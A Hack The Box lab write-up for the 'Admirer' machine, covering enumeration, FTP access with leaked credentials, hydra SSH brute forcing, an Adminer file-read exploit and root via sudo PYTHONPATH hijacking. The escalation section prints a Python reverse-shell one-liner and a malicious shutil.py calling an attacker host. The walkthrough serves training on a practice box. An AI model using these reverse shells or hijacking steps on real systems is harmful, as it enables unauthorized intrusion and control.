---
layout: single
title: Admirer - Hack The Box
excerpt: "Thanks to the robots.txt we found the credentials of the ftp service, when we logged in and viewed the files that were shared we noticed that they were potential contents of the website, this helped us to find the Adminer database manager. We exploited a vulnerability in version 4.6.2 to log in and then upload files from the victim computer. We got full permissions on the system by abusing a script that is related to the website, it has a security flaw that exposes it to the library hijacking vulnerability.
We also learned the importance of the difference between the directory-list-2.3-medium and big.txt dictionary."
date: 2021-08-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-sense/sense_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Web
  - SQL
  - Adminer
  - SETENV  
  - Library Hijacking
---

# Description

Thanks to the robots.txt we found the credentials of the ftp service, when we logged in and viewed the files that were shared we noticed that they were potential contents of the website, this helped us to find the Adminer database manager. We exploited a vulnerability in version 4.6.2 to log in and then upload files from the victim computer. We got full permissions on the system by abusing a script that is related to the website, it has a security flaw that exposes it to the library hijacking vulnerability. We also learned the importance of the difference between the directory-list-2.3-medium and big.txt dictionary.

![](/assets/images/htb-writeup-admirer/admirer-statics.png)

<br>
# Recognition phase

This time I will be testing a script made by [Rana Khalil](https://ranakhalil101.medium.com/), I saw it in one of his writeup and I found it very interesting to leave it doing passive recognition while I enumerate manually.

The script quickly shows us which ports are open by TCP protocol, version and services running on them.

```
$ nmapAutomator.sh 10.10.10.187 All

---------------------Starting Nmap Basic Scan---------------------

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 21:20 CEST
Nmap scan report for 10.10.10.187
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds

---------------------Starting Nmap Basic Scan---------------------

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 21:20 CEST
Nmap scan report for 10.10.10.187
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds
```

## Port analysis

Port analysis:

- Port 21 vsftpd 3.0.3 doesn't appear to have any critical vulnerabilities.
- Port 22 OpenSSH 7.4p1 doesn't seem to have a critical vulnerability either.
- Port 80 Apache httpd 2.4.25, nmap found robots.txt with admin-dir inside.

# Service HTTP Enumeration.

Apparently there is no critical vulnerability on ports 21 and 22, so we start with the enumeration of port 80 which runs an http service, leaving ffuf running in the background in case there are any interesting URLs. 

## Visit http://admirer.htb
![](/assets/images/htb-writeup-admirer/principal-admirer-page.png)

We found nothing interesting on the main page or in the source code, only a contact panel but completing it we don't see anything interesting, also in the source code there is a comment that says that this form is disabled.

![](/assets/images/htb-writeup-admirer/about-form.png)

## Ffuf results

```
$ ffuf -t 200 -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://admirer.htb/FUZZ -e .php,.txt,.html

index.php               [Status: 200, Size: 6051, Words: 385, Lines: 154]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 311, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 138, Words: 21, Lines: 5]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10]
```

## Visit robots.txt

![](/assets/images/htb-writeup-admirer/robots_txt.png)

## So let's visit admirer.htb/admin-dir

![](/assets/images/htb-writeup-admirer/admin-dir.png)

403 Forbidden, we don't have permissions to see the content of the directory but if we have the url of one of the resources of the directory we may be able to see its content. Apply fuzzing in this path to find resources, especially to search for the credentials they talk about in robots.txt

### Something we could do is the following, the robots.txt tells us that there is a directory that must be deleted because it has credentials, to find them faster we can use ``grep``` to filter by keywords that may contain these credentials, and apply fuzzing on specific paths, let's see an example: 
```
$ grep -E -i "credentials|user|pass|database|name|note|key" /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > custom-wordlist.txt

$ cat custom-wordlist.txt | wc -l

1248
```
- -E patterns are extended regular expressions
- -i for case insensitive

```
$ ffuf -c -w custom-wordlist.txt -u http://admirer.htb/admin-dir/FUZZ -e .txt,.html

credentials.txt         [Status: 200, Size: 136, Words: 5, Lines: 12]
:: Progress: [3744/3744] :: Job [1/1] :: 247 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

# credentials.txt, let's see.

Even though we have found the credentials, I would leave ffuf running in the background with a more complete dictionary in case there is more interesting stuff.

credentials.txt

![](/assets/images/htb-writeup-admirer/credentials_txt.png)

Let's try with the ftp service credentials. The others we write down in a notepad.

```
$ ftp 10.10.10.187

Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:lib): ftpuser
331 Please specify the password.
Password:
230 Login successful.

Remote system type is UNIX.
Using binary mode to transfer files.
```

Let's see which shared files are in ftp.
```
ftp> pwd
257 "/" is the current directory

ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-x---    2 0        111          4096 Dec 03  2019 .
drwxr-x---    2 0        111          4096 Dec 03  2019 ..
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
```

There are only two shared files, we download them to our computer to see what they contain inside.

```
ftp> binary
200 Switching to Binary mode.
ftp> mget *
mget dump.sql? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (3.5106 MB/s)
mget html.tar.gz? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 3.88 secs (1.2963 MB/s)
ftp> exit
221 Goodbye.
```
- binary to activate the binary mode, this prevents the files from being corrupted in the transfer to our attacker's computer.
- mget unlike get is to transfer multiple files, and the character * is to indicate that we want to transfer all the files that are available in the current directory.

### We see the content of the files.
```
$ ls 

 dump.sql   html.tar.gz

$ file *

dump.sql:    ASCII text, with very long lines
html.tar.gz: gzip compressed data, last modified: Tue Dec  3 20:20:40 2019, from Unix, original size module 2^32 7321600

$ cat dump.sql

-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: admirerdb
-- ------------------------------------------------------
-- Server version	10.1.41-MariaDB-0+deb9u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `items`
--

DROP TABLE IF EXISTS `items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `thumb_path` text NOT NULL,
  `image_path` text NOT NULL,
  `title` text NOT NULL,
  `text` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `items`
--

LOCK TABLES `items` WRITE;
/*!40000 ALTER TABLE `items` DISABLE KEYS */;
INSERT INTO `items` VALUES (1,'images/thumbs/thmb_art01.jpg','images/fulls/art01.jpg','Visual Art','A pure showcase of skill and emotion.'),(2,'images/thumbs/thmb_eng02.jpg','images/fulls/eng02.jpg','The Beauty and the Beast','Besides the technology, there is also the eye candy...'),(3,'images/thumbs/thmb_nat01.jpg','images/fulls/nat01.jpg','The uncontrollable lightshow','When the sun decides to play at night.'),(4,'images/thumbs/thmb_arch02.jpg','images/fulls/arch02.jpg','Nearly Monochromatic','One could simply spend hours looking at this indoor square.'),(5,'images/thumbs/thmb_mind01.jpg','images/fulls/mind01.jpg','Way ahead of his time','You probably still use some of his inventions... 500yrs later.'),(6,'images/thumbs/thmb_mus02.jpg','images/fulls/mus02.jpg','The outcomes of complexity','Seriously, listen to Dust in Interstellar\'s OST. Thank me later.'),(7,'images/thumbs/thmb_arch01.jpg','images/fulls/arch01.jpg','Back to basics','And centuries later, we want to go back and live in nature... Sort of.'),(8,'images/thumbs/thmb_mind02.jpg','images/fulls/mind02.jpg','We need him back','He might have been a loner who allegedly slept with a pigeon, but that brain...'),(9,'images/thumbs/thmb_eng01.jpg','images/fulls/eng01.jpg','In the name of Science','Some theories need to be proven.'),(10,'images/thumbs/thmb_mus01.jpg','images/fulls/mus01.jpg','Equal Temperament','Because without him, music would not exist (as we know it today).');
/*!40000 ALTER TABLE `items` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2019-12-02 20:24:15
```

### The dump.sql file is a table of items, it refers to the images of the page, it does not contain passwords or users, nothing that can be used to breach the victim computer.

Extract the html.tar.gz file and analyze what is inside.

```
$ tar -xf html.tar.gz

$ ls 
 assets   images   utility-scripts   w4ld0s_s3cr3t_d1r   index.php   robots.txt
```

## Extracted files analysis

```
$ cat robots.txt
User-agent: *

# This folder contains personal stuff, so no one (not even robots!) should see it - waldo
Disallow: /w4ld0s_s3cr3t_d1r
```

```

## These are the lines that contain interesting information from the index.php file, they reveal plaintext credentials.
All the credentials that we find will be saved in our computer.

$ cat index.php

				<!-- Main -->
					<div id="main">			
					 <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
                        $dbname = "admirerdb";

                        // Create connection
                        $conn = new mysqli($servername, $username, $password, $dbname);
                        // Check connection
                        if ($conn->connect_error) {
                            die("Connection failed: " . $conn->connect_error);
                        }

                        $sql = "SELECT * FROM items";
                        $result = $conn->query($sql);

                        if ($result->num_rows > 0) {
                            // output data of each row
                            while($row = $result->fetch_assoc()) {
                                echo "<article class='thumb'>";
    							echo "<a href='".$row["image_path"]."' class='image'><img src='".$row["thumb_path"]."' alt='' /></a>";
	    						echo "<h2>".$row["title"]."</h2>";
	    						echo "<p>".$row["text"]."</p>";
	    					    echo "</article>";
                            }
                        } else {
                            echo "0 results";
                        }
                        $conn->close();
                    ?>
					</div>

```
## Folder w4ld0s_s3cr3t_d1r

```
$ ls
 contacts.txt   credentials.txt

$ cat contacts.txt
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb

$ cat credentials.txt
[Bank Account]
waldo.11
Ezy]m27}OREc$

[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

We see many credentials, a good practice that I recommend is to save separately the users that we find in a pad "users.txt" and passwords on the other hand "passwords.txt" and then perform a brute force attack with hydra or medusa to port 22 ssh service, so we discard reused credentials. 

## Folder utility-scripts

```
$ ls 
 admin_tasks.php   db_admin.php   info.php   phptest.php

$ cat phptest.php
<?php
  echo("Just a test to see if PHP works.");
?>

$ cat info.php
<?php phpinfo(); ?>

$ cat db_admin.php
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>

$ cat admin_tasks.php
<html>
<head>
  <title>Administrative Tasks</title>
</head>
<body>
  <h3>Admin Tasks Web Interface (v0.01 beta)</h3>
  <?php
  // Web Interface to the admin_tasks script
  // 
  if(isset($_REQUEST['task']))
  {
    $task = $_REQUEST['task'];
    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||
       $task == '5' || $task == '6' || $task == '7')
    {
      /*********************************************************************************** 
         Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
                 I'm leaving them in the valid tasks in case I figure out a way
                 to securely run code as root from a PHP page.
      ************************************************************************************/
      echo str_replace("\n", "<br />", shell_exec("/opt/scripts/admin_tasks.sh $task 2>&1"));
    }
    else
    {
      echo("Invalid task.");
    }
  } 
  ?>

  <p>
  <h4>Select task:</p>
  <form method="POST">
    <select name="task">
      <option value=1>View system uptime</option>
      <option value=2>View logged in users</option>
      <option value=3>View crontab</option>
      <option value=4 disabled>Backup passwd file</option>
      <option value=5 disabled>Backup shadow file</option>
      <option value=6 disabled>Backup web data</option>
      <option value=7 disabled>Backup database</option>
    </select>
    <input type="submit">
  </form>
</body>
</html>
```

## Analysis of the files in the utility-scripts folder

### db_admin.php has plaintext credentials, potential database.
```
$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
```

### admin_tasks.php seems to be a script with the following functions 
1) View system uptime
2) View logged in users
3) View crontab (current user only)
4) Backup passwd file (not working)
5) Backup shadow file (not working)
6) Backup web data (not working)
7) Backup database (not working)

## Folder images and assets

```
$ ls assets   
 css   js   sass   webfonts

$ ls images 
 fulls   thumbs
```

In these folders there is nothing interesting, images of the main page, css, js, nothing that we can use as attackers.

## Let's analyze everything we have so far.

- The dump.sql file only has information from the items table, it only contains pictures, nothing useful.
- The file we extracted seems to contain files and folders related to a web server.
- We found many credentials in plain text, both email and user and database credentials.

To advance in the exploitation we have to discard if any of the passwords that we found works to reuse it in a user at system level through the ssh service.
Also we have to test if some of the folders or files exist in the current web page, the robots.txt is different from the one that we find in the page, but when being shared by the ftp service it can be that we find that some of these resources exist in the web server.

Let's start with discarding users and passwords found through brute force with hydra.

## Brute force attack on the ssh service.

### Lists with found users and passwords.
```
$ cat pass.txt                     
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pass.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ]F7jLHw:*G>UPrTo}~A"d6b
   2   │ Ezy]m27}OREc$
   3   │ fgJr6q#S\W:$P
   4   │ %n?4Wz}R$tTF7
   5   │ w0rdpr3ss01!
   6   │ Wh3r3_1s_w4ld0?
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

$ cat users.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ waldo
   2   │ waldo.11
   3   │ admin
   4   │ w.cooper
   5   │ p.wise
   6   │ penny
   7   │ rajesh
   8   │ r.nayyar
   9   │ amy
  10   │ a.bialik
  11   │ leonard
  12   │ l.galecki
  13   │ howard
  14   │ h.helberg
  15   │ bernadette
  16   │ b.rauch
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```
hydra -L "users.txt" -P "passwords.txt" -t 4 -e nsr -s 22 ssh://10.10.10.187 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-27 18:49:29
[DATA] max 4 tasks per 1 server, overall 4 tasks, 153 login tries (l:17/p:9), ~39 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[STATUS] 97.00 tries/min, 97 tries in 00:01h, 56 to do in 00:01h, 4 active
1 of 1 target successfully completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-27 18:51:05
```
- -t 4 tasks number of connects in parallel.
- -e nsr try "n" null password, "s" login as pass and/or "r" reversed login.

We found nothing, reused passwords at system level are discarded.

Now let's check if any of the ftp shares exist on the web server.

## Searching for resources shared by ftp on the web server.

### http://admirer.htb/w4ld0s_s3cr3t_d1r

![](/assets/images/htb-writeup-admirer/waldo-secret-notfound.png)

### http://admirer.htb/utility-scripts/

![](/assets/images/htb-writeup-admirer/utility-scripts-forbidden.png)

```
cd utility-scripts

$ ls
 admin_tasks.php   db_admin.php   info.php   phptest.php
```
<br>
http://admirer.htb/utility-scripts/admin_tasks.php

![](/assets/images/htb-writeup-admirer/web-admin-tasks.png)

<br>
http://admirer.htb/utility-scripts/db_admin.php

![](/assets/images/htb-writeup-admirer/db-admin-web.png)

<br>
http://admirer.htb/utility-scripts/phptest.php

![](/assets/images/htb-writeup-admirer/phptest-web.png)

<br>
http://admirer.htb/utility-scripts/info.php

![](/assets/images/htb-writeup-admirer/phpinfo-web.png)

<br>

### In http://admirer.htb/utility-scripts/admin_tasks.php apparently it is the same script that is shared in ftp.
### Let's test each script option.

<br>
Task 1

![](/assets/images/htb-writeup-admirer/script-task-1.png)

<br>
Task 2

![](/assets/images/htb-writeup-admirer/script-task-2.png)

<br>
Task 3 

![](/assets/images/htb-writeup-admirer/script-task-3.png)

Options 4-7 are disabled as when we read the script, let's intercept the request with BurpSuite and see how the data is sent.

### Intercepted request.

![](/assets/images/htb-writeup-admirer/intercepted.png)

Send it to the repeater and change the enabled task to a disabled one and send the request.

![](/assets/images/htb-writeup-admirer/forcing-disabled-tasks.png)

It does not work with any of the tasks. 

<br>
We have in mind that the resource db_admin.php apparently does not exist in the web server since when we accessed it by the URL it did not return a 404 not found, it may be with a different name and there may be other resources in this directory that are not at first sight in the ftp service, so we apply fuzzing in admirer.htb/utility-scripts/

```
$ ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://admirer.htb/utility-scripts/FUZZ -e .txt,.php

.php                    [Status: 403, Size: 276, Words: 20, Lines: 10]
info.php                [Status: 200, Size: 83795, Words: 4024, Lines: 962]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10]
phptest.php             [Status: 200, Size: 32, Words: 8, Lines: 1]
```
<br>
Didn't find anything, info.php and phptest.php we just saw them. A good practice that I recommend and gave me good results is that when the directory-list-2.3-medium.txt dictionary tipicio doesn't find anything, try the SecLists dictionary big.txt, it has less paths to test than the 2.3-medium but sometimes it finds more paths.

```
$ ffuf -c -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://admirer.htb/utility-scripts/FUZZ -e .txt,.php 

.htaccess.php           [Status: 403, Size: 276, Words: 20, Lines: 10]
.htaccess.txt           [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd.php           [Status: 403, Size: 276, Words: 20, Lines: 10]
.htpasswd.txt           [Status: 403, Size: 276, Words: 20, Lines: 10]
adminer.php             [Status: 200, Size: 4292, Words: 189, Lines: 52]
info.php                [Status: 200, Size: 83793, Words: 4024, Lines: 962]
phptest.php             [Status: 200, Size: 32, Words: 8, Lines: 1]
```

It found the path adminer.php, it makes sense because of the name of the box and the missing database, but here we see with a good example how the dictionary big.txt even though it has much less paths than the directory-list-2.3-medium found a very important resource.


## Visit http://admirer.htb/utility-scripts/adminer.php

![](/assets/images/htb-writeup-admirer/adminer.png)

Here we should try all the credentials we found, especially the database credentials, but none of them work.

Googling about adminer vulnerabilities, I found the following [blog](https://infosecwriteups.com/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f). Following the steps it indicates we can log in correctly.
To simulate the database use [RogueMySQL](https://github.com/allyshka/Rogue-MySql-Server).

## We gained access.
### We continue with the blog steps, we can not see the /etc/passwd or /etc/shadow/ file, but we can see /var/www/html/index.php

![](/assets/images/htb-writeup-admirer/load-file-sql.png)

```
<!-- Main -->
					<div id="main">			
					 <?php
                        $servername = "localhost";
                        $username = "waldo";
                        $password = "&<h5b~yK3F#{PaPB&dA}{H>";
                        $dbname = "admirerdb";
```

### In the index.php of the victim machine are these credentials in plain text, we try to log in via ssh.

```
ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.

waldo@admirer:~$ hostname -I
10.10.10.187 dead:beef::250:56ff:feb9:2900 

cat /home/waldo/user.txt 
9ec4adce34..
```
<br>
# Privilege Escalation

### One of the first things we have to do to enumerate a Linux machine is to look at what commands we can run as sudo, ```sudo -l```.

```
waldo@admirer:/root$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
### Important: 

It has the tag (ALL) SETENV. This means that we can create an environment variable in the context in which the script is executed. 

## /opt/scripts

```
waldo@admirer:/opt/scripts$ ls -la
total 16
drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
```

## admin_tasks.sh
```
waldo@admirer:/opt/scripts$ cat admin_tasks.sh 
#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}



# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi


# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

It is the same that was on the web site, the difference is that this script can be run as sudo, so we will have the ability to run tasks 4-7. 
In the script we do not find any way to exploit it to get the root, but we can see that in one line it executes another script made in python 
```
backup_web()
{
if [ "$EUID" -eq 0 ]
then
echo "Running backup script in the background, it might take a while..."
/opt/scripts/backup.py &
else
echo "Insufficient privileges to perform the selected operation."
fi
}
```

## backup.py
```
waldo@admirer:/opt/scripts$ cat backup.py 
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

## PYTHONPATH Hijacking

The option number 6 of the tasks_admin.sh script executes the backup.py script, when we did a cat we saw that it imports the shutil.py library to use the make_archive() function. We can abuse the SETENV tag that saw when we ran the sudo -l command to "create" that library to put that same malicious function.

Let's see how.

Go to a directory where we have write permissions, create the library shutil.py with the malicious function make_archive(), to this we have to pass 3 arguments because in the last line of the backup.py script it is assigned 3 arguments ```make_archive(dst, 'gztar', src)````, otherwise if we do not assign any argument or a value other than 3 it will give us an error. In the definition of the function we have to put our malicious code, in this [repository](https://github.com/d4t4s3c/Reverse-Shell-Cheat-Sheet) we see a reverse shell with Python3 in an oneliner.

```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```

We convert the oneliner into a valid format for the function.

```
import socket
import subprocess
import os
import pty

def make_archive(a, b, c):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.7",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")
```

Paste the content into the malicious shutil.py library that we recently created and execute the syntax to run the PYTHONPATH Hijacking.

```
waldo@admirer:/dev/shm$ ls
shutil.py
waldo@admirer:/dev/shm$ cat shutil.py 
import socket
import subprocess
import os
import pty

def make_archive(a, b, c):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.7",443))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn("/bin/bash")

waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
```

```
$ nc -nlvp 443   
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.187] 54676
root@admirer:/run/shm# whoami
whoami
root

cat /root/root.txt
92ea34cc16
```
<br>
### Additional information.
Before executing the script.
```
python3 -c "import sys; print('\n'.join(sys.path))"

/usr/lib/python35.zip
/usr/lib/python3.5
